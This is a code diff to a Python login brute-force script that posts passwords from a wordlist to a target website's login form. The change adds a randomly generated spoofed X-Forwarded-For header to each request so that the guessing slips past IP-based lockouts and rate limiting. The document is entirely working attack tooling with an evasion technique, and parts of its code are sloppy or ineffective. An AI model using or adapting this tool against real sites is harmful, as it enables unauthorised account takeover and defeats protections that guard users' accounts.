@@ -1,6 +1,7 @@
 import argparse
 import sys
 import requests
+from random import *
 
 parser = argparse.ArgumentParser(description="Python Bruteforce Login")
 parser.add_argument('--url', help="Website to target", required=True)
@@ -13,7 +14,6 @@ parser.add_argument('--hl', help="Hide Results Via Content-Lenght ", required=Fa
 
 args = parser.parse_args()
 
-
 class bcolors:
     OK = '\033[92m' #GREEN
     WARNING = '\033[93m' #YELLOW
@@ -23,14 +23,17 @@ class bcolors:
     pinocho_chocho = 'y!c'
     RESET = '\033[0m' #RESET COLOR
 
-#proxy = {
-#  'http': 'http://127.0.0.1:8080',
-#}
+proxy = {
+  'http': 'http://127.0.0.1:8080',
+}
 
+global op1
+global op2
+op1 = 1
+op2 = 255
 
-global a 
-a = 0
-
+global a
+a = 1
 def load_words(WORDLIST_FILENAME):
        global line
        print("Starting BruteForce Attack...")
@@ -42,8 +45,22 @@ def load_words(WORDLIST_FILENAME):
                 my_str=line
                 final_str=my_str[:-1]
                 uuuuuu = requests.post(args.url)
+                b = randint(op1, op2)
+                c = randint(op1, op2)
+                d = randint(op1, op2)
+                e = randint(op1, op2)
+                bb = str(b)
+                cc = str(c)
+                dd = str(d)
+                ee = str(e)
                 pp = {'username': args.user,'password': final_str,'user': args.user,'pass': final_str,args.ufield: args.user,args.pfield: final_str}
-                resp = requests.post(args.url,data=pp,proxies=False)
+                dot = "."
+                ip = bb+dot+cc+dot+dd+dot+ee
+                ip2 = str(ip)
+                headers = {
+                'X-Forwarded-For': ip2
+                }
+                resp = requests.post(args.url,data=pp,proxies=False,headers=headers)
                 bbb = resp.status_code
                 arr = len(resp.content)
                 aaaas = len(resp.content)
@@ -57,8 +74,5 @@ def load_words(WORDLIST_FILENAME):
                       a + 1
                     else:
                       a + 1
-
                   
-                
-
 wordlist = load_words(args.wordlist)
